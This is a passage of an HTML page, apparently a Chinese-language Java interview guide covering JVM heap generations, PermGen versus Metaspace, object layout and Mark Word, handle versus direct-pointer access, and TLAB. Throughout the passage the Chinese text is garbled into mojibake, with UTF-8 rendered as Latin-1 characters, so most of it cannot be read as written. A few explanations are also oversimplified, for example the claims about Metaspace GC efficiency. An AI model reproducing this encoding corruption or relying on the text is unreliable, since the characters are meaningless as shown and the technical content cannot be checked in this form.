â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ¯”ä¾‹ï¼ˆé»˜è®¤ï¼‰ï¼š
æ–°ç”Ÿä»£ : è€å¹´ä»£ = <span class="hljs-number">1</span> : <span class="hljs-number">2</span>
Eden : Survivor0 : Survivor1 = <span class="hljs-number">8</span> : <span class="hljs-number">1</span> : <span class="hljs-number">1</span>
</code></pre>
<p><strong>å„éƒ¨åˆ†è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>EdenåŒº</strong>ï¼šæ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨è¿™é‡Œï¼Œçº¦å æ–°ç”Ÿä»£çš„80%</li>
<li><strong>SurvivoråŒº</strong>ï¼šåˆ†ä¸ºS0å’ŒS1ï¼Œç”¨äºMinor GCåå­˜æ´»å¯¹è±¡çš„æš‚å­˜ï¼Œå„çº¦å æ–°ç”Ÿä»£çš„10%</li>
<li><strong>è€å¹´ä»£</strong>ï¼šå­˜å‚¨é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼Œçº¦å å †çš„2/3</li>
</ul>
<p><strong>14. æ–°ç”Ÿä»£å’Œè€å¹´ä»£çš„åŒºåˆ«ï¼Ÿ</strong></p>
<ul>
<li><strong>æ–°ç”Ÿä»£</strong>ï¼šå¯¹è±¡ç”Ÿå‘½å‘¨æœŸçŸ­ï¼ŒGCé¢‘ç¹ï¼Œå å †çš„1/3</li>
<li><strong>è€å¹´ä»£</strong>ï¼šå¯¹è±¡ç”Ÿå‘½å‘¨æœŸé•¿ï¼ŒGCé¢‘ç‡ä½ä½†è€—æ—¶é•¿ï¼Œå å †çš„2/3</li>
</ul>
<p><strong>15. ä¸ºä»€ä¹ˆè¦æœ‰SurvivoråŒºï¼Ÿ</strong></p>
<p>è®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»å‡ æ¬¡ï¼Œåªæœ‰çœŸæ­£é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ‰è¿›å…¥è€å¹´ä»£ï¼Œå‡å°‘Full GCçš„é¢‘ç‡ã€‚</p>
<p><strong>16. ä¸ºä»€ä¹ˆè¦æœ‰ä¸¤ä¸ªSurvivoråŒºï¼Ÿ</strong></p>
<p>å®ç°å¤åˆ¶ç®—æ³•ï¼Œä¿è¯æ–°ç”Ÿä»£å§‹ç»ˆæœ‰ä¸€ä¸ªSurvivoråŒºæ˜¯ç©ºçš„ï¼Œé¿å…å†…å­˜ç¢ç‰‡ã€‚</p>
<p><strong>17. æ–¹æ³•åŒºçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>å­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€JITç¼–è¯‘åçš„ä»£ç ã€‚</p>
<p><strong>18. æ°¸ä¹…ä»£å’Œå…ƒç©ºé—´çš„åŒºåˆ«ï¼Ÿ</strong></p>
<p>ä¸»è¦åŒºåˆ«ï¼š</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ°¸ä¹…ä»£ï¼ˆPermGenï¼‰</th><th>å…ƒç©ºé—´ï¼ˆMetaspaceï¼‰</th></tr></thead><tbody><tr><td><strong>å­˜å‚¨ä½ç½®</strong></td><td>å †å†…å­˜ä¸­</td><td>æœ¬åœ°å†…å­˜ï¼ˆNative Memoryï¼‰</td></tr><tr><td><strong>å¤§å°é™åˆ¶</strong></td><td>å›ºå®šå¤§å°ï¼Œéœ€è¦é¢„å…ˆè®¾ç½®</td><td>åŠ¨æ€è°ƒæ•´ï¼Œé»˜è®¤æ— é™åˆ¶</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>å—JVMå †å†…å­˜é™åˆ¶</td><td>ä¸å—JVMå †å†…å­˜é™åˆ¶</td></tr><tr><td><strong>GCå½±å“</strong></td><td>GCæ•ˆç‡è¾ƒä½</td><td>GCæ•ˆç‡è¾ƒé«˜</td></tr><tr><td><strong>æº¢å‡ºé—®é¢˜</strong></td><td>å®¹æ˜“æº¢å‡ºï¼ˆPermGen spaceï¼‰</td><td>ç›¸å¯¹ä¸å®¹æ˜“æº¢å‡ºï¼ˆMetaspaceï¼‰</td></tr><tr><td><strong>é€‚ç”¨ç‰ˆæœ¬</strong></td><td>JDK 8ä¹‹å‰</td><td>JDK 8åŠä¹‹å</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆæ”¹ç”¨å…ƒç©ºé—´ï¼Ÿ</strong></p>
<ul>
<li>æé«˜GCæ•ˆç‡ï¼šå…ƒç©ºé—´çš„GCæ•ˆç‡æ¯”æ°¸ä¹…ä»£é«˜</li>
<li>é¿å…æº¢å‡ºï¼šæ°¸ä¹…ä»£å›ºå®šå¤§å°å®¹æ˜“æº¢å‡ºï¼Œå…ƒç©ºé—´åŠ¨æ€è°ƒæ•´</li>
<li>æ›´å¥½çš„å†…å­˜ç®¡ç†ï¼šå…ƒç©ºé—´ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼Œç®¡ç†æ›´çµæ´»</li>
</ul>
<p><strong>19. ä¸ºä»€ä¹ˆæ°¸ä¹…ä»£è¢«å…ƒç©ºé—´æ›¿ä»£ï¼Ÿ</strong></p>
<p>æé«˜GCæ•ˆç‡ã€é¿å…æº¢å‡ºã€æ›´å¥½çš„å†…å­˜ç®¡ç†ã€ä¸HotSpotåˆ†ç¦»ã€‚</p>
<p><strong>20. è¿è¡Œæ—¶å¸¸é‡æ± çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>å­˜å‚¨ç¼–è¯‘æœŸç”Ÿæˆçš„å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ã€‚</p>
<p><strong>21. ç›´æ¥å†…å­˜çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>NIOä½¿ç”¨ï¼Œå †å¤–å†…å­˜ï¼Œæé«˜I/Oæ€§èƒ½ã€‚</p>
<h4 data-id="heading-88">14.2 æ·±å…¥ç†è§£é¢˜</h4>
<p><strong>1. å¯¹è±¡åˆ›å»ºçš„è¿‡ç¨‹ï¼Ÿè¯·ç”»å‡ºæµç¨‹å›¾</strong></p>
<p>å¯¹è±¡åˆ›å»ºçš„å®Œæ•´æµç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">å¯¹è±¡åˆ›å»ºæµç¨‹ï¼š

<span class="hljs-bullet">1.</span> ç±»åŠ è½½æ£€æŸ¥
<span class="hljs-bullet">   -</span> æ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½
<span class="hljs-bullet">   -</span> å¦‚æœæ²¡æœ‰ï¼Œæ‰§è¡Œç±»åŠ è½½è¿‡ç¨‹
   â†“
<span class="hljs-bullet">2.</span> åˆ†é…å†…å­˜
<span class="hljs-bullet">   -</span> æŒ‡é’ˆç¢°æ’ï¼ˆå †å†…å­˜è§„æ•´ï¼‰
<span class="hljs-bullet">   -</span> ç©ºé—²åˆ—è¡¨ï¼ˆå †å†…å­˜ä¸è§„æ•´ï¼‰
<span class="hljs-bullet">   -</span> TLABï¼ˆæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹çš„åˆ†é…åŒºåŸŸï¼‰
   â†“
<span class="hljs-bullet">3.</span> åˆå§‹åŒ–é›¶å€¼
<span class="hljs-bullet">   -</span> å°†å†…å­˜ç©ºé—´åˆå§‹åŒ–ä¸ºé›¶å€¼
<span class="hljs-bullet">   -</span> åŸºæœ¬ç±»å‹ï¼š0ã€falseã€0.0
<span class="hljs-bullet">   -</span> å¼•ç”¨ç±»å‹ï¼šnull
   â†“
<span class="hljs-bullet">4.</span> è®¾ç½®å¯¹è±¡å¤´
<span class="hljs-bullet">   -</span> Mark Wordï¼ˆhashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ç­‰ï¼‰
<span class="hljs-bullet">   -</span> ç±»å‹æŒ‡é’ˆï¼ˆæŒ‡å‘ç±»å…ƒæ•°æ®ï¼‰
<span class="hljs-bullet">   -</span> æ•°ç»„é•¿åº¦ï¼ˆå¦‚æœæ˜¯æ•°ç»„ï¼‰
   â†“
<span class="hljs-bullet">5.</span> æ‰§è¡Œæ„é€ å‡½æ•°
<span class="hljs-bullet">   -</span> æ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„ä»£ç 
<span class="hljs-bullet">   -</span> æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–å¯¹è±¡
</code></pre>
<p><strong>è¯¦ç»†è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>ç±»åŠ è½½æ£€æŸ¥</strong>ï¼šé‡åˆ°newæŒ‡ä»¤æ—¶ï¼Œæ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½</li>
<li><strong>åˆ†é…å†…å­˜</strong>ï¼šåœ¨å †ä¸­åˆ†é…å†…å­˜ç©ºé—´ï¼ˆä¼˜å…ˆåœ¨EdenåŒºï¼‰</li>
<li><strong>åˆå§‹åŒ–é›¶å€¼</strong>ï¼šå°†åˆ†é…çš„å†…å­˜åˆå§‹åŒ–ä¸ºé›¶å€¼ï¼Œä¿è¯å­—æ®µå¯ä»¥ä¸èµ‹å€¼å°±ä½¿ç”¨</li>
<li><strong>è®¾ç½®å¯¹è±¡å¤´</strong>ï¼šè®¾ç½®Mark Wordå’Œç±»å‹æŒ‡é’ˆç­‰å…ƒæ•°æ®</li>
<li><strong>æ‰§è¡Œæ„é€ å‡½æ•°</strong>ï¼šæŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–å¯¹è±¡</li>
</ol>
<p><strong>2. å¯¹è±¡çš„å†…å­˜å¸ƒå±€ï¼Ÿè¯·ç”»å‡ºå¸ƒå±€å›¾</strong></p>
<p>å¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡å†…å­˜å¸ƒå±€ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´      â”‚ 
â”‚  - <span class="hljs-selector-tag">Mark</span> Wordâ”‚ (hashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€)
â”‚  - ç±»å‹æŒ‡é’ˆ  â”‚ (æŒ‡å‘ç±»å…ƒæ•°æ®)
â”‚  - æ•°ç»„é•¿åº¦  â”‚ (ä»…æ•°ç»„å¯¹è±¡æœ‰)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®    â”‚ (å­—æ®µçš„å®é™…å€¼)
â”‚  - çˆ¶ç±»å­—æ®µ  â”‚
â”‚  - å­ç±»å­—æ®µ  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……    â”‚ (ä¿è¯<span class="hljs-number">8</span>å­—èŠ‚å¯¹é½)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å¯¹è±¡å¤§å° = å¯¹è±¡å¤´ + å®ä¾‹æ•°æ® + å¯¹é½å¡«å……
</code></pre>
<p><strong>å„éƒ¨åˆ†è¯´æ˜ï¼š</strong></p>
<ol>
<li>
<p><strong>å¯¹è±¡å¤´ï¼ˆHeaderï¼‰</strong></p>
<ul>
<li>Mark Wordï¼šå­˜å‚¨å¯¹è±¡çš„hashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ç­‰</li>
<li>ç±»å‹æŒ‡é’ˆï¼šæŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®</li>
<li>æ•°ç»„é•¿åº¦ï¼šä»…æ•°ç»„å¯¹è±¡æœ‰</li>
</ul>
</li>
<li>
<p><strong>å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰</strong></p>
<ul>
<li>å­˜å‚¨å¯¹è±¡çš„å®é™…å­—æ®µå€¼</li>
<li>çˆ¶ç±»å­—æ®µåœ¨å‰ï¼Œå­ç±»å­—æ®µåœ¨å</li>
<li>ç›¸åŒå®½åº¦çš„å­—æ®µåˆ†é…åœ¨ä¸€èµ·</li>
</ul>
</li>
<li>
<p><strong>å¯¹é½å¡«å……ï¼ˆPaddingï¼‰</strong></p>
<ul>
<li>ä¿è¯å¯¹è±¡å¤§å°æ˜¯8å­—èŠ‚çš„å€æ•°</li>
<li>æé«˜å†…å­˜è®¿é—®æ•ˆç‡</li>
</ul>
</li>
</ol>
<p><strong>3. å¯¹è±¡å¤´åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ</strong></p>
<ul>
<li>Mark Wordï¼šhashCodeã€GCå¹´é¾„ã€é”çŠ¶æ€ç­‰</li>
<li>ç±»å‹æŒ‡é’ˆï¼šæŒ‡å‘ç±»å…ƒæ•°æ®</li>
<li>æ•°ç»„é•¿åº¦ï¼šä»…æ•°ç»„å¯¹è±¡æœ‰</li>
</ul>
<p><strong>4. Mark Wordçš„ä½œç”¨å’Œç»“æ„ï¼Ÿ</strong></p>
<p><strong>Mark Wordçš„ä½œç”¨ï¼š</strong></p>
<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„è¿è¡Œæ—¶æ•°æ®ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>
<ul>
<li><strong>hashCode</strong>ï¼šå¯¹è±¡çš„å“ˆå¸Œç </li>
<li><strong>GCå¹´é¾„</strong>ï¼šå¯¹è±¡ç»å†çš„GCæ¬¡æ•°ï¼ˆ4ä½ï¼Œæœ€å¤§15ï¼‰</li>
<li><strong>é”çŠ¶æ€</strong>ï¼šåå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”ç­‰</li>
<li><strong>åå‘çº¿ç¨‹ID</strong>ï¼šåå‘é”çš„çº¿ç¨‹ID</li>
<li><strong>åå‘æ—¶é—´æˆ³</strong>ï¼šåå‘é”çš„æ—¶é—´æˆ³</li>
</ul>
<p><strong>Mark Wordçš„ç»“æ„ï¼ˆ64ä½JVMï¼‰ï¼š</strong></p>





























<table><thead><tr><th>é”çŠ¶æ€</th><th>Mark Wordï¼ˆ64ä½ï¼‰</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>hashCode(31ä½) + GCå¹´é¾„(4ä½) + ...</td></tr><tr><td><strong>åå‘é”</strong></td><td>çº¿ç¨‹ID(54ä½) + Epoch(2ä½) + ...</td></tr><tr><td><strong>è½»é‡çº§é”</strong></td><td>æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ(62ä½) + ...</td></tr><tr><td><strong>é‡é‡çº§é”</strong></td><td>æŒ‡å‘monitorçš„æŒ‡é’ˆ(62ä½) + ...</td></tr><tr><td><strong>GCæ ‡è®°</strong></td><td>ç©ºï¼ˆä¸éœ€è¦è®°å½•ä¿¡æ¯ï¼‰</td></tr></tbody></table>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨ä¸åŒçš„ä¿¡æ¯</li>
<li>32ä½JVMï¼š32ä½ï¼Œ64ä½JVMï¼š64ä½</li>
<li>è¿™æ˜¯synchronizedé”å‡çº§çš„åŸºç¡€</li>
</ul>
<p><strong>5. ç±»å‹æŒ‡é’ˆçš„ä½œç”¨ï¼Ÿ</strong></p>
<p>æŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼Œç”¨äºç¡®å®šå¯¹è±¡ç±»å‹ã€æ”¯æŒinstanceofç­‰ã€‚</p>
<p><strong>6. å¯¹è±¡çš„è®¿é—®å®šä½æ–¹å¼æœ‰å“ªäº›ï¼Ÿè¯·ç”»å‡ºä¸¤ç§æ–¹å¼çš„å¯¹æ¯”å›¾</strong></p>
<p>å¯¹è±¡çš„è®¿é—®å®šä½æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<p><strong>æ–¹å¼1ï¼šå¥æŸ„è®¿é—®</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å¥æŸ„è®¿é—®ï¼š

æ ˆå¼•ç”¨ â†’ å¥æŸ„æ±  â†’ å¯¹è±¡å®ä¾‹æ•°æ®
<span class="hljs-code">              â†’ ç±»å‹æ•°æ®
</span>
è®¿é—®è¿‡ç¨‹ï¼šéœ€è¦ä¸¤æ¬¡è®¿é—®ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰
</code></pre>
<p><strong>æ–¹å¼2ï¼šç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotä½¿ç”¨ï¼‰</strong></p>
<pre><code class="hljs">ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotï¼‰ï¼š

æ ˆå¼•ç”¨ â†’ å¯¹è±¡å®ä¾‹æ•°æ® â†’ ç±»å‹æ•°æ®ï¼ˆé€šè¿‡å¯¹è±¡å¤´ä¸­ç±»å‹æŒ‡é’ˆï¼‰

è®¿é—®è¿‡ç¨‹ï¼šåªéœ€ä¸€æ¬¡è®¿é—®ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰
</code></pre>
<p><strong>ä¸¤ç§æ–¹å¼çš„å¯¹æ¯”ï¼š</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>å¥æŸ„è®¿é—®</th><th>ç›´æ¥æŒ‡é’ˆè®¿é—®</th></tr></thead><tbody><tr><td><strong>è®¿é—®æ¬¡æ•°</strong></td><td>ä¸¤æ¬¡ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰</td><td>ä¸€æ¬¡ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>è¾ƒå¿«</td></tr><tr><td><strong>å¼•ç”¨ç¨³å®šæ€§</strong></td><td>å¼•ç”¨ä¸å˜ï¼Œå¯¹è±¡ç§»åŠ¨åªéœ€æ›´æ–°å¥æŸ„</td><td>å¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</td></tr><tr><td><strong>GCå¼€é”€</strong></td><td>è¾ƒå°ï¼ˆåªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°å¥æŸ„ï¼‰</td><td>è¾ƒå¤§ï¼ˆéœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>è¾ƒå¤§ï¼ˆéœ€è¦é¢å¤–çš„å¥æŸ„æ± ï¼‰</td><td>è¾ƒå°ï¼ˆä¸éœ€è¦å¥æŸ„æ± ï¼‰</td></tr></tbody></table>
<p><strong>HotSpotä¸ºä»€ä¹ˆä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Ÿ</strong></p>
<ul>
<li>æ€§èƒ½ä¼˜å…ˆï¼šè®¿é—®é€Ÿåº¦å¿«ï¼Œå‡å°‘é—´æ¥è®¿é—®å¼€é”€</li>
<li>å¯¹è±¡ç§»åŠ¨è¾ƒå°‘ï¼šç°ä»£GCç®—æ³•å¯ä»¥æ›´å¥½åœ°å¤„ç†å¯¹è±¡ç§»åŠ¨</li>
</ul>
<p><strong>7. å¥æŸ„è®¿é—®å’Œç›´æ¥æŒ‡é’ˆè®¿é—®çš„åŒºåˆ«ï¼Ÿ</strong></p>
<p>ä¸»è¦åŒºåˆ«ï¼š</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>å¥æŸ„è®¿é—®</th><th>ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotï¼‰</th></tr></thead><tbody><tr><td><strong>è®¿é—®æ¬¡æ•°</strong></td><td>ä¸¤æ¬¡ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰</td><td>ä¸€æ¬¡ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>è¾ƒå¿«</td></tr><tr><td><strong>å¼•ç”¨ç¨³å®šæ€§</strong></td><td>å¼•ç”¨ä¸å˜ï¼Œå¯¹è±¡ç§»åŠ¨åªéœ€æ›´æ–°å¥æŸ„</td><td>å¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</td></tr><tr><td><strong>GCå¼€é”€</strong></td><td>è¾ƒå°ï¼ˆåªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°å¥æŸ„ï¼‰</td><td>è¾ƒå¤§ï¼ˆéœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>è¾ƒå¤§ï¼ˆéœ€è¦é¢å¤–çš„å¥æŸ„æ± ï¼‰</td><td>è¾ƒå°ï¼ˆä¸éœ€è¦å¥æŸ„æ± ï¼‰</td></tr><tr><td><strong>å®ç°å¤æ‚åº¦</strong></td><td>è¾ƒé«˜ï¼ˆéœ€è¦ç»´æŠ¤å¥æŸ„æ± ï¼‰</td><td>è¾ƒä½</td></tr></tbody></table>
<p><strong>HotSpotä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®çš„åŸå› ï¼š</strong></p>
<ul>
<li>è®¿é—®é€Ÿåº¦å¿«ï¼Œåªéœ€ä¸€æ¬¡å†…å­˜è®¿é—®</li>
<li>å¯¹è±¡ç§»åŠ¨é¢‘ç‡ä½ï¼Œç°ä»£GCç®—æ³•ä¼˜åŒ–äº†å¯¹è±¡ç§»åŠ¨</li>
<li>å®ç°ç®€å•ï¼Œä¸éœ€è¦ç»´æŠ¤å¥æŸ„æ± </li>
</ul>
<p><strong>8. HotSpotä¸ºä»€ä¹ˆä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Ÿ</strong></p>
<p>æ€§èƒ½ä¼˜å…ˆï¼Œè®¿é—®é€Ÿåº¦å¿«ï¼Œå‡å°‘é—´æ¥è®¿é—®å¼€é”€ã€‚</p>
<p><strong>9. TLABæ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</strong></p>
<p>Thread Local Allocation Bufferï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºæœ‰ç‹¬ç«‹çš„åˆ†é…åŒºåŸŸï¼Œé¿å…å¤šçº¿ç¨‹åˆ†é…å†…å­˜æ—¶çš„ç«äº‰ï¼Œæé«˜åˆ†é…æ•ˆç‡ã€‚</p>
<p><strong>10. æŒ‡é’ˆç¢°æ’å’Œç©ºé—²åˆ—è¡¨çš„åŒºåˆ«ï¼Ÿ</strong></p>
<ul>
<li><strong>æŒ‡é’ˆç¢°æ’</strong>ï¼šé€‚ç”¨äºå †å†…å­˜è§„æ•´ï¼Œç§»åŠ¨æŒ‡é’ˆåˆ†é…è¿ç»­å†…å­˜</li>
<li><strong>ç©ºé—²åˆ—è¡¨</strong>ï¼šé€‚ç”¨äºå †å†…å­˜ä¸è§„æ•´ï¼Œä»ç©ºé—²åˆ—è¡¨åˆ†é…</li>
</ul>
<p><strong>11. å¯¹è±¡å¤§å°å¦‚ä½•è®¡ç®—ï¼Ÿ</strong></p>
<p>å¯¹è±¡å¤´å¤§å° + å®ä¾‹æ•°æ®å¤§å° + å¯¹é½å¡«å……</p>
<p><strong>12. å¯¹é½å¡«å……çš„ä½œç”¨ï¼Ÿ</strong></p>
<p>ä¿è¯å¯¹è±¡å¤§å°æ˜¯8å­—èŠ‚çš„å€æ•°ï¼Œæé«˜å†…å­˜è®¿é—®æ•ˆç‡ã€‚</p>
<h3 data-id="heading-89">15. ç»¼åˆé¢è¯•é¢˜</h3>
<h4 data-id="heading-90">15.1 ç»¼åˆç†è§£é¢˜</h4>
<p><strong>1. JMMä¸»å†…å­˜ä¸JVMå †çš„å…³ç³»ï¼Ÿ</strong></p>
<p>JMMä¸­çš„"ä¸»å†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"å †"ã€‚å…±äº«å˜é‡å­˜å‚¨åœ¨å †ä¸­ï¼Œå †æ˜¯çº¿ç¨‹å…±äº«çš„ã€‚</p>
<p><strong>2. JMMå·¥ä½œå†…å­˜ä¸JVMè™šæ‹Ÿæœºæ ˆçš„å…³ç³»ï¼Ÿ</strong></p>
<p>JMMä¸­çš„"å·¥ä½œå†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨"ã€‚å˜é‡å‰¯æœ¬å­˜å‚¨åœ¨å±€éƒ¨å˜é‡è¡¨ä¸­ã€‚</p>
<p><strong>3. å¯¹è±¡åœ¨å †ä¸­æ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Ÿè¯·ç”»å‡ºå­˜å‚¨ç»“æ„</strong></p>
<p>å¯¹è±¡åœ¨å †ä¸­çš„å­˜å‚¨ç»“æ„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡åœ¨å †ä¸­çš„å¸ƒå±€ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´      â”‚ 
â”‚  - <span class="hljs-selector-tag">Mark</span> Wordâ”‚ (<span class="hljs-number">64</span>ä½æˆ–<span class="hljs-number">32</span>ä½)
â”‚  - ç±»å‹æŒ‡é’ˆ  â”‚ (<span class="hljs-number">32</span>ä½æˆ–<span class="hljs-number">64</span>ä½ï¼Œå¯èƒ½å‹ç¼©)
â”‚  - æ•°ç»„é•¿åº¦  â”‚ (ä»…æ•°ç»„ï¼Œ<span class="hljs-number">32</span>ä½)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®    â”‚ 
â”‚  - å­—æ®µå€¼    â”‚ (æŒ‰é¡ºåºå­˜å‚¨)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……    â”‚ (ä¿è¯<span class="hljs-number">8</span>å­—èŠ‚å¯¹é½)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å­˜å‚¨è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å¯¹è±¡å¤´</strong>ï¼šåŒ…å«Mark Wordå’Œç±»å‹æŒ‡é’ˆï¼Œç”¨äºæ ‡è¯†å¯¹è±¡å’ŒæŒ‡å‘ç±»ä¿¡æ¯</li>
<li><strong>å®ä¾‹æ•°æ®</strong>ï¼šå­˜å‚¨å¯¹è±¡çš„å®é™…å­—æ®µå€¼ï¼ŒæŒ‰ç…§æŸç§ç­–ç•¥æ’åº</li>
<li><strong>å¯¹é½å¡«å……</strong>ï¼šä¿è¯å¯¹è±¡å¤§å°æ˜¯8å­—èŠ‚çš„å€æ•°ï¼Œæé«˜è®¿é—®æ•ˆç‡</li>
</ol>
<p><strong>å†…å­˜åˆ†é…ä½ç½®ï¼š</strong></p>
<ul>
<li>æ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨EdenåŒº</li>
<li>é•¿æœŸå­˜æ´»çš„å¯¹è±¡ä¼šè¿›å…¥è€å¹´ä»£</li>
</ul>
<p><strong>4. å¤šçº¿ç¨‹å¦‚ä½•è®¿é—®å †ä¸­çš„å…±äº«å¯¹è±¡ï¼Ÿ</strong></p>
<ol>
<li>çº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</li>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«åŒä¸€ä¸ªå¯¹è±¡</li>
<li>è®¿é—®å…±äº«å¯¹è±¡éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ol>
<p><strong>5. ä¸ºä»€ä¹ˆéœ€è¦JMMï¼ŸJVMå†…å­˜åŒºåŸŸä¸å¤Ÿå—ï¼Ÿ</strong></p>
<p>JVMå†…å­˜åŒºåŸŸåªå®šä¹‰äº†æ•°æ®å­˜å‚¨åœ¨å“ªé‡Œï¼Œä½†æ²¡æœ‰å®šä¹‰å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¦‚ä½•ä¿è¯å†…å­˜çš„å¯è§æ€§å’Œæœ‰åºæ€§ã€‚JMMæä¾›äº†å†…å­˜è®¿é—®è§„èŒƒï¼Œè§£å†³å¤šçº¿ç¨‹å¹¶å‘è®¿é—®çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-91">16. é«˜çº§é¢è¯•é¢˜</h3>
<h4 data-id="heading-92">16.1 æ·±å…¥åŸç†é¢˜</h4>
<p><strong>1. å¯¹è±¡åœ¨å †ä¸­çš„åˆ†é…è¿‡ç¨‹ï¼Ÿè¯·ç”»å‡ºè¯¦ç»†æµç¨‹å›¾</strong></p>
<p>å¯¹è±¡åœ¨å †ä¸­çš„åˆ†é…è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">åˆ†é…è¿‡ç¨‹ï¼š

<span class="hljs-bullet">1.</span> ç±»åŠ è½½æ£€æŸ¥
   â†“
